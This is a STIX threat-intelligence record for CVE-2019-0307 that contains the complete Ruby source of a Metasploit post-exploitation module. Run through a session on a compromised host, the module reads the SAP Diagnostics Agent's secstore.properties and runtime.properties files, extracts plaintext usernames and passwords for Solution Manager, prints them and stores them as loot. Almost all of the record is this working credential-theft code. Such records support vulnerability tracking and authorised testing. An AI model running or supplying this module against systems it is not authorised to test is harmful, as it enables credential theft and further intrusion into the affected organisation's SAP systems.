{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea2b73d9-76b9-4a7c-ad71-4c3475fe3c22",
    "created": "2024-08-14T16:33:18.009526Z",
    "modified": "2024-08-14T16:33:18.009529Z",
    "name": "Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server",
    "description": " This module retrieves the `secstore.properties` file on a SMDAgent. This file contains the credentials used by the SMDAgent to connect to the SAP Solution Manager server.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/sap/smdagent_get_properties.rb",
            "external_id": "smdagent_get_properties.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0307"
        },
        {
            "source_name": "reference",
            "url": "https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'resolv'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty\n\n  SECSTORE_FILE = 'secstore.properties'.freeze\n  RUNTIME_FILE = 'runtime.properties'.freeze\n\n  WIN_PREFIX = 'c:\\\\usr\\\\sap\\\\DAA\\\\'.freeze\n  UNIX_PREFIX = '/usr/sap/DAA/'.freeze\n\n  WIN_SUFFIX = '\\\\SMDAgent\\\\configuration\\\\'.freeze\n  UNIX_SUFFIX = '/SMDAgent/configuration/'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',\n        'Description' => %q{\n          This module retrieves the `secstore.properties` file on a SMDAgent. This file contains the credentials\n          used by the SMDAgent to connect to the SAP Solution Manager server.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability\n          'Vladimir Ivanov' # @_generic_human_ This Metasploit module\n        ],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => %w[meterpreter shell],\n        'References' => [\n          [ 'CVE', '2019-0307' ],\n          [ 'URL', 'https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_host\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def run\n    case session.type\n    when 'meterpreter'\n      meterpreter = true\n    else\n      meterpreter = false\n    end\n    case session.platform\n    when 'windows'\n      windows = true\n      instances = dir(WIN_PREFIX)\n    else\n      windows = false\n      instances = dir(UNIX_PREFIX)\n    end\n\n    if instances.nil? || instances.empty?\n      fail_with(Failure::NotFound, 'SAP root directory not found')\n    end\n\n    instances.each do |instance|\n      next if instance == 'SYS'\n\n      next if instance.include? ' '\n\n      next if instance.include? '.'\n\n      next if instance.include? 'tmp'\n\n      if windows\n        runtime_properties_file_name = \"#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{RUNTIME_FILE}\"\n        secstore_properties_file_name = \"#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{SECSTORE_FILE}\"\n      else\n        runtime_properties_file_name = \"#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{RUNTIME_FILE}\"\n        secstore_properties_file_name = \"#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{SECSTORE_FILE}\"\n      end\n\n      runtime_properties = parse_properties_file(runtime_properties_file_name, meterpreter)\n      secstore_properties = parse_properties_file(secstore_properties_file_name, meterpreter)\n\n      next if runtime_properties.empty?\n\n      print_line\n      print_status(\"Instance: #{instance}\")\n      print_status(\"Runtime properties file name: #{runtime_properties_file_name}\")\n      print_status(\"Secstore properties file name: #{secstore_properties_file_name}\")\n\n      sld_protocol = nil\n      sld_hostname = nil\n      sld_address = nil\n      sld_port = nil\n      sld_username = nil\n      sld_password = nil\n\n      smd_url = nil\n      smd_username = nil\n      smd_password = nil\n\n      # Parse runtime.properties file\n      runtime_properties.each do |property|\n        if property[:name].include?('sld.')\n          case property[:name]\n          when /hostprotocol/\n            sld_protocol = property[:value]\n          when /hostname/\n            sld_hostname = property[:value]\n          when /hostport/\n            sld_port = property[:value]\n          end\n        elsif property[:name].include?('smd.')\n          case property[:name]\n          when /url/\n            smd_url = property[:value].gsub(/\\\\:/, ':')\n          end\n        end\n      end\n\n      # Parse secstore.properties file\n      secstore_properties.each do |property|\n        if property[:name].include?('sld/')\n          case property[:name]\n          when /usr/\n            sld_username = property[:value]\n          when /pwd/\n            sld_password = property[:value]\n          end\n        elsif property[:name].include?('smd/')\n          case property[:name]\n          when /User/\n            smd_username = property[:value]\n          when /Password/\n            smd_password = property[:value]\n          end\n        end\n      end\n\n      # Print SLD properties\n      if !sld_protocol.nil? || !sld_hostname.nil? || !sld_port.nil? || !sld_username.nil? || !sld_password.nil?\n        print_line\n        print_status('SLD properties:')\n        print_status(\"SLD protocol: #{sld_protocol}\") unless sld_protocol.nil?\n        unless sld_hostname.nil?\n          print_status(\"SLD hostname: #{sld_hostname}\")\n          if meterpreter\n            if sld_hostname =~ Resolv::IPv4::Regex\n              sld_address = sld_hostname\n            else\n              begin\n                sld_address = session.net.resolve.resolve_host(sld_hostname)[:ip]\n                print_status(\"SLD address: #{sld_address}\")\n              rescue Rex::Post::Meterpreter::RequestError\n                print_error(\"Failed to resolve SLD hostname: #{sld_hostname}\")\n              end\n            end\n          end\n        end\n        print_status(\"SLD port: #{sld_port}\") unless sld_port.nil?\n        print_good(\"SLD username: #{sld_username}\") unless sld_username.nil?\n        print_good(\"SLD password: #{sld_password}\") unless sld_password.nil?\n      end\n\n      # Print SMD properties\n      if !smd_url.nil? || !smd_username.nil? || !smd_password.nil?\n        print_line\n        print_status('SMD properties:')\n        print_status(\"SMD url: #{smd_url}\") unless smd_url.nil?\n        print_good(\"SMD username: #{smd_username}\") unless smd_username.nil?\n        print_good(\"SMD password: #{smd_password}\") unless smd_password.nil?\n      end\n\n      # Store decoded credentials, report service and vuln\n      print_line\n      if sld_username.nil? || sld_password.nil?\n        print_error(\"File #{secstore_properties_file_name} read, but this file is likely encrypted or does not contain credentials. This SMDAgent is likely patched.\")\n      else\n        # Store decoded credentials\n        print_good('Store decoded credentials for SolMan server')\n        if sld_address.nil? || sld_port.nil?\n          service_data = {}\n        else\n          service_data = {\n            origin_type: :service,\n            address: sld_address,\n            port: sld_port,\n            service_name: 'http',\n            protocol: 'tcp'\n          }\n          # Report service\n          report_service(\n            host: sld_address,\n            port: sld_port,\n            name: 'http',\n            proto: 'tcp',\n            info: 'SAP Solution Manager'\n          )\n        end\n        store_valid_credential(\n          user: sld_username,\n          private: sld_password,\n          private_type: :password,\n          service_data: service_data\n        )\n        # Report vulnerability\n        if meterpreter\n          agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)\n        else\n          agent_host = session.session_host\n        end\n        report_vuln(\n          host: agent_host,\n          name: name,\n          refs: references\n        )\n      end\n    end\n  end\n\n  def parse_properties_file(filename, is_meterpreter)\n    properties = []\n    if file_exist?(filename)\n      properties_content = read_file(filename)\n      if properties_content.nil?\n        print_error(\"Failed to read properties file: #{filename}\")\n      else\n        if is_meterpreter\n          agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)\n        else\n          agent_host = session.session_host\n        end\n        loot = store_loot('smdagent.properties', 'text/plain', agent_host, properties_content, filename, 'SMD Agent properties file')\n        print_good(\"File #{filename} saved in: #{loot}\")\n        properties = parse_properties(properties_content)\n      end\n    else\n      print_error(\"File: #{filename} does not exist\")\n    end\n    properties\n  end\n\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}